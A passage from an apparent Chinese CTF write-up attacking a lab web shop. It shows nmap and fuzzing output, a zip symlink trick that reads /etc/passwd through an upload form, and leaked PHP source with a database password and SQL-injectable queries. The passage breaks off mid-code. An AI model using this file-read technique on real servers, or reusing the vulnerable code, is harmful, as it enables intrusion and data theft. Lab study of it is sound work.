(10.129.48.105)</span><br><span class=\"line\">Host is up (0.32s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 6.04 seconds</span><br></pre></td></tr></table></figure></p>\n<p>根据我的扫描得到的目录有</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Target: http://10.129.48.105/FUZZ</span><br><span class=\"line\">Total requests: 45524</span><br><span class=\"line\"></span><br><span class=\"line\">=====================================================================</span><br><span class=\"line\">ID           Response   Lines    Word       Chars       Payload</span><br><span class=\"line\">=====================================================================</span><br><span class=\"line\"></span><br><span class=\"line\">000000006:   200        317 L    1354 W     16736 Ch    &quot;index.php&quot;</span><br><span class=\"line\">000000082:   301        9 L      28 W       315 Ch      &quot;assets&quot;</span><br><span class=\"line\">000000290:   301        9 L      28 W       316 Ch      &quot;uploads&quot;</span><br><span class=\"line\">000000291:   200        113 L    380 W      5322 Ch     &quot;upload.php&quot;</span><br><span class=\"line\">000000925:   403        9 L      28 W       278 Ch      &quot;.htpasswd&quot;</span><br><span class=\"line\">000001526:   301        9 L      28 W       313 Ch      &quot;shop&quot;</span><br><span class=\"line\">000013450:   403        9 L      28 W       278 Ch      &quot;.htaccess&quot;</span><br></pre></td></tr></table></figure></p>\n<p>先去访问这个 upload.php</p>\n<p>发现我们上传一般的木马上传不上去，文件名格式必须是压缩包的，并且压缩包内还必须包含.pdf 文件</p>\n<p>经过尝试这个题可以使用 zip 符号链接来达到任意读取</p>\n<p>参考链接 (2023 年大学生信息安全竞赛 unzip)</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://ctf.njupt.edu.cn/archives/898</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -s ../../../../../etc/passwd pass</span><br><span class=\"line\">然后将这个pass加上后缀.pdf</span><br><span class=\"line\">在通过</span><br><span class=\"line\">zip --symlinks pass.zip pass.pdf</span><br><span class=\"line\">进行解压</span><br></pre></td></tr></table></figure></p>\n<p>完成后进入</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://10.129.48.105/upload.php</span><br></pre></td></tr></table></figure></p>\n<p>上传成功后点击链接查看</p>\n<p>我使用的火狐能够查看，使用 edge 或者谷歌都会报错</p>\n<p>那我们现在开始任意读取了</p>\n<p>经过读取发现</p>\n<p>/shop/index.php</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">// Include functions and connect to the database using PDO MySQL</span><br><span class=\"line\">include &#x27;functions.php&#x27;;</span><br><span class=\"line\">$pdo = pdo_connect_mysql();</span><br><span class=\"line\">// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.</span><br><span class=\"line\">$page = isset($_GET[&#x27;page&#x27;]) &amp;&amp; file_exists($_GET[&#x27;page&#x27;] . &#x27;.php&#x27;) ? $_GET[&#x27;page&#x27;] : &#x27;home&#x27;;</span><br><span class=\"line\">// Include and show the requested page</span><br><span class=\"line\">include $page . &#x27;.php&#x27;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>functions.php</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">function pdo_connect_mysql() &#123;</span><br><span class=\"line\">    // Update the details below with your MySQL details</span><br><span class=\"line\">    $DATABASE_HOST = &#x27;localhost&#x27;;</span><br><span class=\"line\">    $DATABASE_USER = &#x27;root&#x27;;</span><br><span class=\"line\">    $DATABASE_PASS = &#x27;MySQL_P@ssw0rd!&#x27;;</span><br><span class=\"line\">    $DATABASE_NAME = &#x27;zipping&#x27;;</span><br><span class=\"line\">    try &#123;</span><br><span class=\"line\">    \treturn new PDO(&#x27;mysql:host=&#x27; . $DATABASE_HOST . &#x27;;dbname=&#x27; . $DATABASE_NAME . &#x27;;charset=utf8&#x27;, $DATABASE_USER, $DATABASE_PASS);</span><br><span class=\"line\">    &#125; catch (PDOException $exception) &#123;</span><br><span class=\"line\">    \t// If there is an error with the connection, stop the script and display the error.</span><br><span class=\"line\">    \texit(&#x27;Failed to connect to database!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// Template header, feel free to customize this</span><br><span class=\"line\">function template_header($title) &#123;</span><br><span class=\"line\">$num_items_in_cart = isset($_SESSION[&#x27;cart&#x27;]) ? count($_SESSION[&#x27;cart&#x27;]) : 0;</span><br><span class=\"line\">echo &lt;&lt;&lt;EOT</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">\t&lt;head&gt;</span><br><span class=\"line\">\t\t&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class=\"line\">\t\t&lt;title&gt;$title&lt;/title&gt;</span><br><span class=\"line\">\t\t&lt;link href=&quot;assets/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;</span><br><span class=\"line\">\t\t&lt;link rel=&quot;stylesheet&quot; href=&quot;https://use.fontawesome.com/releases/v5.7.1/css/all.css&quot;&gt;</span><br><span class=\"line\">\t&lt;/head&gt;</span><br><span class=\"line\">\t&lt;body&gt;</span><br><span class=\"line\">        &lt;header&gt;</span><br><span class=\"line\">            &lt;div class=&quot;content-wrapper&quot;&gt;</span><br><span class=\"line\">                &lt;a href=&quot;..&quot; style=&quot;text-decoration: none;&quot;&gt;&lt;h1&gt;Zipping Watch Store&lt;/h1&gt;&lt;/a&gt;</span><br><span class=\"line\">                &lt;nav&gt;</span><br><span class=\"line\">                    &lt;a href=&quot;index.php&quot;&gt;Home&lt;/a&gt;</span><br><span class=\"line\">                    &lt;a href=&quot;index.php?page=products&quot;&gt;Products&lt;/a&gt;</span><br><span class=\"line\">                &lt;/nav&gt;</span><br><span class=\"line\">                &lt;div class=&quot;link-icons&quot;&gt;</span><br><span class=\"line\">                    &lt;a href=&quot;index.php?page=cart&quot;&gt;</span><br><span class=\"line\">\t\t\t\t\t\t&lt;i class=&quot;fas fa-shopping-cart&quot;&gt;&lt;/i&gt;</span><br><span class=\"line\">\t\t\t\t\t\t&lt;span&gt;$num_items_in_cart&lt;/span&gt;</span><br><span class=\"line\">\t\t\t\t\t&lt;/a&gt;</span><br><span class=\"line\">                &lt;/div&gt;</span><br><span class=\"line\">            &lt;/div&gt;</span><br><span class=\"line\">        &lt;/header&gt;</span><br><span class=\"line\">        &lt;main&gt;</span><br><span class=\"line\">EOT;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// Template footer</span><br><span class=\"line\">function template_footer() &#123;</span><br><span class=\"line\">$year = date(&#x27;Y&#x27;);</span><br><span class=\"line\">echo &lt;&lt;&lt;EOT</span><br><span class=\"line\">        &lt;/main&gt;</span><br><span class=\"line\">        &lt;footer&gt;</span><br><span class=\"line\">            &lt;div class=&quot;content-wrapper&quot;&gt;</span><br><span class=\"line\">                &lt;p&gt;&amp;copy; $year, Zipping Watch Store&lt;/p&gt;</span><br><span class=\"line\">            &lt;/div&gt;</span><br><span class=\"line\">        &lt;/footer&gt;</span><br><span class=\"line\">    &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">EOT;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>在这里得到了数据库的用户和密码</p>\n<p>product.php</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">// Check to make sure the id parameter is specified in the URL</span><br><span class=\"line\">if (isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class=\"line\">    $id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">    // Filtering user input for letters or special characters</span><br><span class=\"line\">    if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;\\[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;, $id, $match)) &#123;</span><br><span class=\"line\">        header(&#x27;Location: index.php&#x27;);</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        // Prepare statement and execute, but does not prevent SQL injection</span><br><span class=\"line\">        $stmt = $pdo-&gt;prepare(&quot;SELECT * FROM products WHERE id = &#x27;$id&#x27;&quot;);</span><br><span class=\"line\">        $stmt-&gt;execute();</span><br><span class=\"line\">        // Fetch the product from the database and return the result as an Array</span><br><span class=\"line\">        $product = $stmt-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class=\"line\">        // Check if the product exists (array is not empty)</span><br><span class=\"line\">        if (!$product) &#123;</span><br><span class=\"line\">            // Simple error to display if the id for the product doesn&#x27;t exists (array is empty)</span><br><span class=\"line\">            exit(&#x27;Product does not exist!&#x27;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    // Simple error to display if the id wasn&#x27;t specified</span><br><span class=\"line\">    exit(&#x27;No ID provided!&#x27;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?=template_header(&#x27;Zipping | Product&#x27;)?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;product content-wrapper&quot;&gt;</span><br><span class=\"line\">    &lt;img src=&quot;assets/imgs/&lt;?=$product[&#x27;img&#x27;]?&gt;&quot; width=&quot;500&quot; height=&quot;500&quot; alt=&quot;&lt;?=$product[&#x27;name&#x27;]?&gt;&quot;&gt;</span><br><span class=\"line\">    &lt;div&gt;</span><br><span class=\"line\">        &lt;h1 class=&quot;name&quot;&gt;&lt;?=$product[&#x27;name&#x27;]?&gt;&lt;/h1&gt;</span><br><span class=\"line\">        &lt;span class=&quot;price&quot;&gt;</span><br><span class=\"line\">            &amp;dollar;&lt;?=$product[&#x27;price&#x27;]?&gt;</span><br><span class=\"line\">            &lt;?php if ($product[&#x27;rrp&#x27;] &gt; 0): ?&gt;</span><br><span class=\"line\">            &lt;span class=&quot;rrp&quot;&gt;&amp;dollar;&lt;?=$product[&#x27;rrp&#x27;]?&gt;&lt;/span&gt;</span><br><span class=\"line\">            &lt;?php endif; ?&gt;</span><br><span class=\"line\">        &lt;/span&gt;</span><br><span class=\"line\">        &lt;form action=&quot;index.php?page=cart&quot; method=&quot;post&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;number&quot; name=&quot;quantity&quot; value=&quot;1&quot; min=&quot;1&quot; max=&quot;&lt;?=$product[&#x27;quantity&#x27;]?&gt;&quot; placeholder=&quot;Quantity&quot; required&gt;</span><br><span class=\"line\">            &lt;input type=&quot;hidden&quot; name=&quot;product_id&quot; value=&quot;&lt;?=$product[&#x27;id&#x27;]?&gt;&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; value=&quot;Add To Cart&quot;&gt;</span><br><span class=\"line\">        &lt;/form&gt;</span><br><span class=\"line\">        &lt;div class=&quot;description&quot;&gt;</span><br><span class=\"line\">            &lt;?=$product[&#x27;desc&#x27;]?&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?=template_footer()?&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>cart.php</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">// If the user clicked the add to cart button on the product page we can check for the form data</span><br><span class=\"line\">if (isset($_POST[&#x27;product_id&#x27;], $_POST[&#x27;quantity&#x27;])) &#123;</span><br><span class=\"line\">    // Set the post variables so we easily identify them, also make sure they are integer</span><br><span class=\"line\">    $product_id = $_POST[&#x27;product_id&#x27;];</span><br><span class=\"line\">    $quantity = $_POST[&#x27;quantity&#x27;];</span><br><span class=\"line\">    // Filtering user input for letters or special characters</span><br><span class=\"line\">    if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;\\[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]/i&quot;, $quantity, $match)) &#123;</span><br><span class=\"line\">        echo &#x27;&#x27;;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        // Construct the SQL statement with a vulnerable parameter</span><br><span class=\"line\">        $sql = &quot;SELECT * FROM products WHERE id = &#x27;&quot; . $_POST[&#x27;product_id&#x27;] . &quot;&#x27;&quot;;</span><br><span class=\"line\">        // Execute the SQL statement without any sanitization or parameter binding</span><br><span class=\"line\">        $product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class=\"line\">        // Check if the product exists (array is not empty)</span><br><span class=\"line\">        if ($product &amp;&amp; $quantity &gt; 0) &#123;</span><br><span class=\"line\">            // Product exists in database, now we can create/update the session variable for the cart</span><br><span class=\"line\">            if (isset($_SESSION[&#x27;cart&#x27;]) &amp;&amp; is_array($_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class=\"line\">                if (array_key_exists($product_id, $_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class=\"line\">                    // Product exists in cart so just update the quanity</span><br><span class=\"line\">                    $_SESSION[&#x27;cart&#x27;][$product_id] += $quantity;</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                    // Product is not in cart so add it</span><br><span class=\"line\">                    $_SESSION[&#x27;cart&#x27;][$product_id] = $quantity;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                // There are no products in cart, this will add the first product to cart</span><br><span class=\"line\">                $_SESSION[&#x27;cart&#x27;] = array($product_id =&gt; $quantity);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        // Prevent form resubmission...</span><br><span class=\"line\">        header(&#x27;location: index.php?page=cart&#x27;);</span><br><span class=\"line\">        exit;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Remove product from cart, check for the URL param &quot;remove&quot;, this is the product id, make sure it&#x27;s a number and check if it&#x27;s in the cart</span><br><span class=\"line\">if (isset($_GET[&#x27;remove&#x27;]) &amp;&amp; is_numeric($_GET[&#x27;remove&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;][$_GET[&#x27;remove&#x27;]])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    // Remove the product from the shopping cart</span><br><span class=\"line\">    unset($_SESSION[&#x27;cart&#x27;][$_GET[&#x27;remove&#x27;]]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Update product quantities in cart if the user clicks the &quot;Update&quot; button on the shopping cart page</span><br><span class=\"line\">if (isset($_POST[&#x27;update&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class=\"line\">    // Loop through the post data so we can update the quantities for every product in cart</span><br><span class=\"line\">    foreach ($_POST as $k =&gt; $v) &#123;</span><br><span class=\"line\">        if (strpos($k, &#x27;quantity&#x27;) !== false &amp;&amp; is_numeric($v)) &#123;</span><br><span class=\"line\">            $id = str_replace(&#x27;quantity-&#x27;, &#x27;&#x27;, $k);</span><br><span class=\"line\">            $quantity = (int)$v;</span><br><span class=\"line\">            // Always do checks and validation</span><br><span class=\"line\">            if (is_numeric($id) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;][$id]) &amp;&amp; $quantity &gt; 0) &#123;</span><br><span class=\"line\">                // Update new quantity</span><br><span class=\"line\">                $_SESSION[&#x27;cart&#x27;][$id] = $quantity;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    // Prevent form resubmission...</span><br><span class=\"line\">    header(&#x27;location: index.php?page=cart&#x27;);</span><br><span class=\"line\">    exit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Send the user to the place order page if they click the Place Order button, also the cart should not be empty</span><br><span class=\"line\">if (isset($_POST[&#x27;placeorder&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;]) &amp;&amp; !empty($_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class=\"line\">    header(&#x27;Location: index.php?page=placeorder&#x27;);</span><br><span class=\"line\">    exit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_POST[&#x27;clear&#x27;])) &#123;</span><br><span class=\"line\">\tunset($_SESSION[&#x27;cart&#x27;]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Check the session variable for products in cart</span><br><span class=\"line\">$products_in_cart = isset($_SESSION[&#x27;cart&#x27;]) ? $_SESSION[&#x27;cart&#x27;] : array();</span><br><span class=\"line\">$products = array();</span><br><span class=\"line\">$subtotal = 0.00;</span><br><span class=\"line\">// If there are products in cart</span><br><span class=\"line\">if ($products_in_cart) &#123;</span><br><span class=\"line\">    // There are products in the cart so we need to select those products from the database</span><br><span class=\"line\">    // Products in cart array to question mark string array, we need the SQL statement to include IN (?,?,?,...etc)</span><br><span class=\"line\">    $array_to_question_marks = implode(&#x27;,&#x27;, array_fill(0, count($products_in_cart), &#x27;?&#x27;));</span><br><span class=\"line\">    $stmt = $pdo-&gt;prepare(&#x27;SELECT * FROM products WHERE id IN (&#x27; . $array_to_question_marks . &#x27;)&#x27;);</span><br><span class=\"line\">    // We only need the array keys, not the values, the keys are the id&#x27;s of the products</span><br><span class=\"line\">    $stmt-&gt;execute(array_keys($products_in_cart));</span><br><span class=\"line\">    // Fetch the products from the database and return the result as an Array</span><br><span class=\"line\">    $products = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);</span><br><span class=\"line\">    // Calculate the subtotal</span><br><span class=\"line\">    foreach ($products as $product) &#123;</span><br><span class=\"line\">        $subtotal += (float)$product[&#x27;price&#x27;] * (int)$products_in_cart[$product[&#x27;id&#x27;]];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?=template_header(&#x27;Zipping | Cart&#x27;)?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;cart content-wrapper&quot;&gt;</span><br><span class=\"line\">    &lt;h1&gt;Shopping Cart&lt;/h1&gt;</span><br><span class=\"line\">    &lt;form action=&quot;index.php?page=cart&quot; method=&quot;post&quot;&gt;</span><br><span class=\"line\">        &lt;table&gt;</span><br><span class=\"line\">            &lt;thead&gt;</span><br><span class=\"line\">                &lt;tr&gt;</span><br><span class=\"line\">                    &lt;td colspan=&quot;2&quot;&gt;Product&lt;/td&gt;</span><br><span class=\"line\">                    &lt;td&gt;Price&lt;/td&gt;</span><br><span class=\"line\">                    &lt;td&gt;Quantity&lt;/td&gt;</span><br><span class=\"line\">                    &lt;td&gt;Total&lt;/td&gt;</span><br><span class=\"line\">                &lt;/tr&gt;</span><br><span class=\"line\">            &lt;/thead&gt;</span><br><span class=\"line\">            &lt;tbody&gt;</span><br><span class=\"line\">                &lt;?php if (empty($products)): ?&gt;</span><br><span class=\"line\">                &lt;tr&gt;</span><br><span class=\"line\">                    &lt;td colspan=&quot;5&quot; style=&quot;text-align:center;&quot;&gt;You have no products added in your Shopping Cart&lt;/td&gt;</span><br><span class=\"line\">                &lt;/tr&gt;</span><br><span class=\"line\">                &lt;?php else: ?&gt;</span><br><span class=\"line\">                &lt;?php foreach ($products as $product): ?&gt;</span><br><span class=\"line\">                &lt;tr&gt;</span><br><span class=\"line\">                    &lt;td class=&quot;img&quot;&gt;</span><br><span class=\"line\">                        &lt;a href=&quot;index.php?page=product&amp;id=&lt;?=$product[&#x27;id&#x27;]?&gt;&quot;&gt;</span><br><span class=\"line\">                            &lt;img src=&quot;assets/imgs/&lt;?=$product[&#x27;img&#x27;]?&gt;&quot; width=&quot;50&quot; height=&quot;50&quot; alt=&quot;&lt;?=$product[&#x27;name&#x27;]?&gt;&quot;&gt;</span><br><span class=\"line\">                        &lt;/a&gt;</span><br><span class=\"line\">                    &lt;/td&gt;</span><br><span class=\"line\">                    &lt;td&gt;</span><br><span class=\"line\">                        &lt;a href=&quot;index.php?page=product&amp;id=&lt;?=$product[&#x27;id&#x27;]?&gt;&quot;&gt;&lt;?=$product[&#x27;name&#x27;]?&gt;&lt;/a&gt;</span><br><span class=\"line\">                        &lt;br&gt;</span><br><span class=\"line\">                        